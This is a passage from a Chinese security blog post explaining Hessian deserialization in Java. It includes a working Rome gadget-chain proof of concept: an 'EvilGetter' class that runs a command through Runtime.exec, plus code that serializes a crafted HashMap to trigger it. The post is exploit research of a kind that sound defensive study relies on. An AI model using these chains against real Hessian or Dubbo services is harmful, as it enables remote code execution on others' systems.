<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="Hessian 反序列化 Gadgets一、Hessian反序列化流程这里简单描述一下Hessian的反序列化流程。">
<meta property="og:type" content="article">
<meta property="og:title" content="Hessian_反序列化_Gadgets">
<meta property="og:url" content="http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/index.html">
<meta property="og:site_name" content="m1sn0w">
<meta property="og:description" content="Hessian 反序列化 Gadgets一、Hessian反序列化流程这里简单描述一下Hessian的反序列化流程。">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/image-20220929121737456-5299514.png">
<meta property="og:image" content="http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/image-20220929140429369-5299514.png">
<meta property="og:image" content="http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/image-20220929140932086-5299514.png">
<meta property="og:image" content="http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/image-20220929141331899-5299514.png">
<meta property="og:image" content="http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/image-20220929173113080-5299514.png">
<meta property="og:image" content="http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/image-20220929173208361-5299514.png">
<meta property="og:image" content="http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/image-20220929182008029-5299514.png">
<meta property="og:image" content="http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/image-20220929182108619-5299514.png">
<meta property="og:image" content="http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/image-20220929182236243-5299514.png">
<meta property="og:image" content="http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/image-20220930165353144-5299514.png">
<meta property="og:image" content="http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/image-20220930170201294-5299514.png">
<meta property="article:published_time" content="2022-10-09T07:08:36.000Z">
<meta property="article:modified_time" content="2022-10-09T07:13:30.803Z">
<meta property="article:author" content="m1sn0w">
<meta property="article:tag" content="Java安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/image-20220929121737456-5299514.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Hessian_反序列化_Gadgets</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/lib/meslo-LG/styles.css">

    
<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">

    
<link rel="stylesheet" href="/css/style.css">

    <!-- rss -->
    
    
    <!-- jquery -->
    
<script src="/lib/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 5.4.2"></head>

<body>
    <div class="banner">
<div id="blogtitel" class="blogtitel">m1sn0w</div>
<ul id="wrapper" class="wrapper">
  <div class="sun">
    <div class="star"></div>
  </div>
  <div class="mercury">
    <div class="planet">
      <div class="shadow"></div>
    </div>
  </div>
  <div class="venus">
    <div class="planet">
      <div class="shadow"></div>
    </div>
  </div>
  <div class="earth">
    <div class="planet"><div class="shadow"></div></div>
  </div>
  <div class="mars">
    <div class="planet"><div class="shadow"></div></div>
  </div>
  <div class="jupiter">
    <div class="planet"><div class="shadow"></div></div>
  </div>
</ul>
</div>

    <div class="background">
      
        <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/2022/09/25/%E5%9F%9F%E6%B8%97%E9%80%8F---%E9%BB%84%E9%87%91%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%BC%AA%E9%80%A0/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/&text=Hessian_反序列化_Gadgets"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/&title=Hessian_反序列化_Gadgets"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/&is_video=false&description=Hessian_反序列化_Gadgets"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Hessian_反序列化_Gadgets&body=Check out this article: http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/&title=Hessian_反序列化_Gadgets"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/&title=Hessian_反序列化_Gadgets"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/&title=Hessian_反序列化_Gadgets"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/&title=Hessian_反序列化_Gadgets"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/&name=Hessian_反序列化_Gadgets&description=&lt;h1 id=&#34;Hessian-反序列化-Gadgets&#34;&gt;&lt;a href=&#34;#Hessian-反序列化-Gadgets&#34; class=&#34;headerlink&#34; title=&#34;Hessian 反序列化 Gadgets&#34;&gt;&lt;/a&gt;Hessian 反序列化 Gadgets&lt;/h1&gt;&lt;h2 id=&#34;一、Hessian反序列化流程&#34;&gt;&lt;a href=&#34;#一、Hessian反序列化流程&#34; class=&#34;headerlink&#34; title=&#34;一、Hessian反序列化流程&#34;&gt;&lt;/a&gt;一、Hessian反序列化流程&lt;/h2&gt;&lt;p&gt;这里简单描述一下Hessian的反序列化流程。&lt;/p&gt;"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets"><span class="toc-number">1.</span> <span class="toc-text">Hessian 反序列化 Gadgets</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">一、Hessian反序列化流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets"><span class="toc-number">1.2.</span> <span class="toc-text">二、Hessian反序列化Gadgets</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89Rome-Gadgets"><span class="toc-number">1.2.1.</span> <span class="toc-text">（1）Rome Gadgets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89Rome-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets"><span class="toc-number">1.2.2.</span> <span class="toc-text">（2）Rome 二次反序列化 Gadgets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89Resin-Gadgets"><span class="toc-number">1.2.3.</span> <span class="toc-text">（3）Resin Gadgets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89XBean-Gadgets"><span class="toc-number">1.2.4.</span> <span class="toc-text">（4）XBean Gadgets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%885%EF%BC%89Spring-Partially-Comparable-Advisor-Holder-Gadgets"><span class="toc-number">1.2.5.</span> <span class="toc-text">（5）Spring Partially Comparable Advisor Holder Gadgets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%886%EF%BC%89Spring-Abstract-Bean-Factory-Pointcut-Advisor-Gadgets"><span class="toc-number">1.2.6.</span> <span class="toc-text">（6）Spring Abstract Bean Factory Pointcut Advisor Gadgets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%887%EF%BC%89JDK%E5%8E%9F%E7%94%9FGadgets"><span class="toc-number">1.2.7.</span> <span class="toc-text">（7）JDK原生Gadgets</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BCEL%E5%8A%A0%E8%BD%BD%E5%99%A8RCE-Gadgets"><span class="toc-number">1.2.7.1.</span> <span class="toc-text">BCEL加载器RCE Gadgets</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MethodUtil-RCE-Gadgets"><span class="toc-number">1.2.7.2.</span> <span class="toc-text">MethodUtil RCE Gadgets</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">1.3.</span> <span class="toc-text">三、参考文章</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%B0%8F%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">四、小结</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

      
      <div class="content index width mx-auto px2 my4">
          
          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Hessian_反序列化_Gadgets
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">m1sn0w</span>
      </span>
      
    <div class="postdate">
        <time datetime="2022-10-09T07:08:36.000Z" itemprop="datePublished">2022-10-09</time>
    </div>


      
    <div class="article-tag">
        <i class="fa fa-tag"></i>
        <a class="tag-link-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="Hessian-反序列化-Gadgets"><a href="#Hessian-反序列化-Gadgets" class="headerlink" title="Hessian 反序列化 Gadgets"></a>Hessian 反序列化 Gadgets</h1><h2 id="一、Hessian反序列化流程"><a href="#一、Hessian反序列化流程" class="headerlink" title="一、Hessian反序列化流程"></a>一、Hessian反序列化流程</h2><p>这里简单描述一下Hessian的反序列化流程。</p>
<span id="more"></span>

<p>定义两个接口：<code>Common</code>和<code>Inner</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">package org.apache.dubbo.samples.basic.api;</span><br><span class="line"></span><br><span class="line">public interface Common &#123;</span><br><span class="line">    String sayHello(String name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">package org.apache.dubbo.samples.basic.api;</span><br><span class="line"></span><br><span class="line">public interface Inner &#123;</span><br><span class="line">    String sayHello(String name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>两个实现类：<code>HessianObject</code>和<code>InnerObject</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">package org.apache.dubbo.samples.basic.impl;</span><br><span class="line"></span><br><span class="line">import org.apache.dubbo.samples.basic.api.Common;</span><br><span class="line">import org.apache.dubbo.samples.basic.api.Inner;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class HessianObject implements Common,Serializable &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private Inner inner;</span><br><span class="line"></span><br><span class="line">    public HessianObject(String name, Inner inner) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.inner = inner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Inner getInner() &#123;</span><br><span class="line">        return inner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setInner(Inner inner) &#123;</span><br><span class="line">        this.inner = inner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String sayHello(String name)&#123;</span><br><span class="line">        System.out.println(&quot;outter say&quot;);</span><br><span class="line">        return &quot;hello!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;HessianObject&#123;&quot; +</span><br><span class="line">                &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +</span><br><span class="line">                &quot;, inner=&quot; + inner +</span><br><span class="line">                &#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">package org.apache.dubbo.samples.basic.impl;</span><br><span class="line"></span><br><span class="line">import org.apache.dubbo.samples.basic.api.Inner;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class InnerObject implements Inner,Serializable&#123;</span><br><span class="line">    private String innerName;</span><br><span class="line"></span><br><span class="line">    public String sayHello(String name)&#123;</span><br><span class="line">        System.out.println(&quot;inner say&quot;);</span><br><span class="line">        return &quot;inner!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getInnerName() &#123;</span><br><span class="line">        return innerName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setInnerName(String innerName) &#123;</span><br><span class="line">        this.innerName = innerName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;InnerObject&#123;&quot; +</span><br><span class="line">                &quot;innerName=&#x27;&quot; + innerName + &#x27;\&#x27;&#x27; +</span><br><span class="line">                &#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>实例化<code>HessianObject</code>对象后将其序列化：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 实例化HessianObject对象</span><br><span class="line">InnerObject innerObject = new InnerObject();</span><br><span class="line">innerObject.setInnerName(&quot;inner_m1sn0w&quot;);</span><br><span class="line">HessianObject hessianObject = new HessianObject(&quot;m1sn0w&quot;,innerObject);</span><br><span class="line"></span><br><span class="line">// 序列化对象后保存到文件中</span><br><span class="line">HessianOutput hessianOutput = new HessianOutput(new FileOutputStream(&quot;/tmp/hessian.class&quot;));</span><br><span class="line">hessianOutput.writeObject(hessianObject);</span><br></pre></td></tr></table></figure>

<p>最后生成的文件内容如下：</p>
<p><img src="./image-20220929121737456-5299514.png" alt="image-20220929121737456"></p>
<p>在Hessian进行反序列化的过程中，会取出其中的二进制字符进行相应的处理。以上面为例，处理逻辑如下：</p>
<p>1、第一个字符<code>M</code>用来表示<code>tag</code>，hessian根据这个值寻找对应的处理逻辑。后面的<code>t</code>控制流程处理，依据后面的两个字节获取type长度。（简单描述就是Mt用来标识一个对象，后面两个字符通过运算获取一个长度）</p>
<p>2、根据长度，获取到后面的类的类名：org.apache.dubbo.samples.basic.impl.HessianObject</p>
<p>3、获取类名之后，底层逻辑会通过反射实例化类，并获取这个类中的字段值。</p>
<p>4、接下来处理<code>S</code>，其实也就是字段名，后面两个..表示长度，获取inner字段值。然后Mt 又开始解析对象，最后给inner赋值。</p>
<p>5、迭代处理完成之后，获取z字符，表示当前类对应的对象实例化完成，后面继续解析name字符，赋值为m1sn0w后获取z字符结束。</p>
<p>（源码比较简单，也容易理解）</p>
<p>Hessian在进行反序列化的时候，并不需要具体类实现<code>Serializable</code>接口。只需要在进行序列化数据生成的时候，设置<code>setAllowNonSerializable(true)</code>即可。（不论是否实现<code>Serializable</code>接口，最后生成的二进制数据是完全一样的）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># Dubbo Hessian设置如下</span><br><span class="line">HessianOutput hessianOutput = new HessianOutput(new FileOutputStream(&quot;/tmp/hessian.class&quot;));</span><br><span class="line">hessianOutput.findSerializerFactory().setAllowNonSerializable(true);</span><br><span class="line">hessianOutput.writeObject(hessianObject);</span><br><span class="line"></span><br><span class="line"># 原生Hessian设置如下</span><br><span class="line">ByteArrayOutputStream bos = new ByteArrayOutputStream();</span><br><span class="line">AbstractHessianOutput out = new HessianOutput(bos);</span><br><span class="line">SerializerFactory serializerFactory = new SerializerFactory();</span><br><span class="line">serializerFactory.setAllowNonSerializable(true);</span><br><span class="line">out.setSerializerFactory(serializerFactory);</span><br><span class="line">out.writeObject(hashMap1);</span><br><span class="line">out.close();</span><br></pre></td></tr></table></figure>



<h2 id="二、Hessian反序列化Gadgets"><a href="#二、Hessian反序列化Gadgets" class="headerlink" title="二、Hessian反序列化Gadgets"></a>二、Hessian反序列化Gadgets</h2><p>其实简单跟一下Hessian反序列化的处理逻辑就会发现它和原生JDK的反序列化不同。（它不会调用重写的readObject方法）</p>
<p>Hessian在反序列化Map对象的时候，会依次反序列化其中的对象值，然后调用put方法还原Map对象。因此在实际构造Gadgets时候，都会利用hashmap的put方法作为入口，可以调用任意对象的hashCode方法或者equals方法。比较常见的Gadgets有如下几个：</p>
<h3 id="（1）Rome-Gadgets"><a href="#（1）Rome-Gadgets" class="headerlink" title="（1）Rome Gadgets"></a>（1）Rome Gadgets</h3><p>Rome这条链子比较短。触发点在<code>ToStringBean</code>的<code>toString</code>方法：</p>
<p><img src="./image-20220929140429369-5299514.png" alt="image-20220929140429369"></p>
<p>由于<code>beanClass</code>和<code>obj</code>是类的属性，在反序列化的时候可以当成可控值。这里的逻辑是调用某个对象的所有<code>getter</code>方法。这也就拓展了后半部分的利用方式。</p>
<p>同样，在<code>EqualsBean</code>的<code>beanEquals</code>方法中也会调用任意对象的getter方法。</p>
<p><img src="./image-20220929140932086-5299514.png" alt="image-20220929140932086"></p>
<p>简单看看Rome Gadgets的入口类，也就是<code>ObjectBean</code>：</p>
<p><img src="./image-20220929141331899-5299514.png" alt="image-20220929141331899"></p>
<p>这三个方法都可以调到上面所说的两个触发的地方。Hessian在反序列化HashMap的时候，会调用任意对象hashCode-&gt;toString方法。方便验证，自己写一个getter的恶意类：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package org.apache.dubbo.samples.basic.impl;</span><br><span class="line"></span><br><span class="line">public class EvilGetter &#123;</span><br><span class="line">    private String name;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;);</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            System.out.println(e.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用toString触发的调用栈如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">at org.example.EvilGetter.getName(EvilGetter.java:10)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">at com.sun.syndication.feed.impl.ToStringBean.toString(ToStringBean.java:137)</span><br><span class="line">at com.sun.syndication.feed.impl.ToStringBean.toString(ToStringBean.java:116)</span><br><span class="line">at com.sun.syndication.feed.impl.EqualsBean.beanHashCode(EqualsBean.java:193)</span><br><span class="line">at com.sun.syndication.feed.impl.ObjectBean.hashCode(ObjectBean.java:110)</span><br><span class="line">at java.util.HashMap.hash(HashMap.java:340)</span><br><span class="line">at java.util.HashMap.put(HashMap.java:613)</span><br><span class="line">at com.caucho.hessian.io.MapDeserializer.readMap(MapDeserializer.java:114)</span><br><span class="line">at com.caucho.hessian.io.SerializerFactory.readMap(SerializerFactory.java:577)</span><br><span class="line">at com.caucho.hessian.io.HessianInput.readObject(HessianInput.java:1160)</span><br><span class="line">at org.example.Main.main(Main.java:31)</span><br></pre></td></tr></table></figure>

<p>本地验证代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">EvilGetter evilGetter = new EvilGetter();</span><br><span class="line">ToStringBean toStringBean = new ToStringBean(EvilGetter.class,evilGetter);</span><br><span class="line">ObjectBean objectBean = new ObjectBean(String.class,&quot;123&quot;);</span><br><span class="line">HashMap hashMap = new HashMap();</span><br><span class="line">hashMap.put(objectBean,&#x27;a&#x27;);</span><br><span class="line"></span><br><span class="line">Class clazz = ObjectBean.class;</span><br><span class="line">Field field = clazz.getDeclaredField(&quot;_equalsBean&quot;);</span><br><span class="line">field.setAccessible(true);</span><br><span class="line">field.set(objectBean,new EqualsBean(ToStringBean.class,toStringBean));</span><br><span class="line"></span><br><span class="line">HessianOutput hessianOutput = new HessianOutput(new FileOutputStream(&quot;/tmp/hessian.class&quot;));</span><br><span class="line">hessianOutput.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">HessianInput hessianInput = new HessianInput(new FileInputStream(&quot;/tmp/hessian.class&quot;));</span><br><span class="line">hessianInput.readObject();</span><br></pre></td></tr></table></figure>

<p>以上代码可以在原生的Hessian中运行，也就是如下maven坐标中的Hessian包：</p>
